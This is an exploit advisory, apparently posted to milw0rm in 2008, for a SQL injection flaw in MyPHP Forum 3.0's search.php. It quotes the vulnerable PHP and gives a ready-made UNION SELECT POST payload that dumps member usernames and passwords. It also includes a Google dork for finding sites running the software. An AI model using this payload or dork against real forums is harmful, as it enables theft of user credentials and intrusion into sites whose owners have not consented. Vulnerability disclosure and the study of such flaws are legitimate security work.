<html><head><title>MyPHP Forum <= 3.0 (Final) Remote SQL Injection Vulnerability</title></head><pre>#=================================================================================================# 
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  &lt;_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  &gt;__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                    This is a Public Exploit.                                    #
#				   Date: 03/01/2008 [dd,mm,yyyy]                                  #
#                                                                                                 #
#                                      !!!Happy New Year!!!                                       #
#                                                                                                 #
#=================================================================================================#
#   MyPHP Forum v3.0 (Final) And Maybe Lower Multiple Sql Injection Vulnerabilities (Mq=Off/On)   #
#                                                                                                 #
#                                       Vendor:   www.myphp.ws                                    #
#                                     Severity:   Highest                                         #
#                                       Author:   The:Paradox                                     #
#                                                                                                 #
#=================================================================================================#                                                                                                 
#                                       Proud To Be Italian.                                      #
#=================================================================================================#
&quot;&quot;&quot;                                                                                                
                                            Related Codes:
                                         search.php; line 14:

if($_POST['submit']) {
	$searchtext = $_POST['searchtext'];
	$searchuser = $_POST['searchuser'];

	if(!strstr($searchtext, '&quot;')) {
		$keywords = explode(&quot; &quot;, $searchtext);
		for($i = 0; $i &lt; count($keywords); $i++) {
			if($sqladdon != &quot;&quot;) {
				$sqladdon .= &quot; AND p.message LIKE '%$keywords[$i]%'&quot;;
			} else {
				$sqladdon .= &quot;p.message LIKE '%$keywords[$i]%'&quot;;
			}
		}
	} else {
		$phrase = trim(stripslashes(strstr($searchtext, '&quot;')));
		$quotesarr = explode('&quot;', $phrase);
		$quotes = count($quotesarr);
		$phrasecount = $quotes - (count(explode('&quot; &quot;', $phrase)) + 1);

		for($i = 0; $i &lt; $quotes; $i++) {
			if($i != 0 &amp;&amp; $i != $quotes - 1) {
				if($phraseoff != &quot;yes&quot;) {
					$phraselist .= &quot;$quotesarr[$i]|&quot;;
					$phraseoff = &quot;yes&quot;;
				} else {
					$phraseoff = &quot;no&quot;;
				}
			}
		}

		$phrasearr = explode(&quot;|&quot;, $phraselist);
		$phrases = count($phrasearr) - 1;

		for($i = 0; $i &lt; $phrases; $i++) {
			if($sqladdon != &quot;&quot;) {
				$sqladdon .= &quot; AND p.message LIKE '%$phrasearr[$i]%'&quot;;
			} else {
				$sqladdon .= &quot;p.message LIKE '%$phrasearr[$i]%'&quot;;
			}
		}
		
		$newsearchtxt = trim(str_replace(&quot;$phrase&quot;, &quot;&quot;, stripslashes($searchtext)));

		if($newsearchtxt != &quot;&quot;) {
			$keywords = explode(&quot; &quot;, $newsearchtxt);
		}

		for($i = 0; $i &lt; count($keywords); $i++) {
			if($sqladdon != &quot;&quot;) {
				$sqladdon .= &quot; AND p.message LIKE '%$keywords[$i]%'&quot;;
			} else {
				$sqladdon .= &quot;p.message LIKE '%$keywords[$i]%'&quot;;
			}
		}
	}

	if($searchuser != &quot;&quot;) {
		if($sqladdon != &quot;&quot;) {
				$sqladdon .= &quot; AND p.author LIKE '%$searchuser%'&quot;;
			} else {
				$sqladdon .= &quot;p.author LIKE '%$searchuser%'&quot;;
			}
	}

	if($sqladdon != &quot;&quot; ) {
		search_header();
		$ttnum = 1;		// Now the Vulnerable Query =)
		$query = mysql_query(&quot;SELECT t.*, f.name AS forum FROM $db_post p, $db_topic t, $db_forum f WHERE $sqladdon AND t.tid=p.tid AND f.fid=t.fid&quot;) or die(mysql_error());
		
&quot;&quot;&quot;
#=================================================================================================#
# Proof Of Concept / Bug Explanation:                                                             #
#                                                                                                 #
# A lot of Sql injection Vulnerabilities were found in this platform, but most of them work only  #
# with the server configuration Magic Quotes Off.                                                 #
# Whatever in Search.php there is a $searchtext is not propelly checked before the mysql_query.   #
# The page does stripslashes to $searchtext var making us able to do an Sql injection with the    #
# configuration of Magic Quotes On.                                                               #
#                                                                                                 #
#=================================================================================================#
# Post Query :                                                                                    
#                                                                                                 
# submit=Search&amp;searchtext=%'/**/UNION/**/SELECT/**/0,0,0,concat('&lt;BR/&gt;&lt;h3&gt;-=ParadoxGotThisOne=-&lt;/h3&gt;&lt;BR/&gt;&lt;h4&gt;Username:',username,'&lt;BR/&gt;Password:',password,'&lt;/h4&gt;'),0,0,0,0,0,0/**/FROM/**/[Prefix]_member/**/WHERE/**/uid=[Id]/*&quot;
#                                                                                                 
# Attenction: the last &quot; is needed (see code).                                                    
#                                                                                                 
#=================================================================================================#
# Other injection vulnerabilities were found, but them were not pulished.                         #
#=================================================================================================#
# Google Dork=&gt; Powered by MyPHP Forum v3.0                                                       #
#=================================================================================================#
# Use this at your own risk. You are responsible for your own deeds.                              #
#=================================================================================================#

# milw0rm.com [2008-01-03]</pre></html>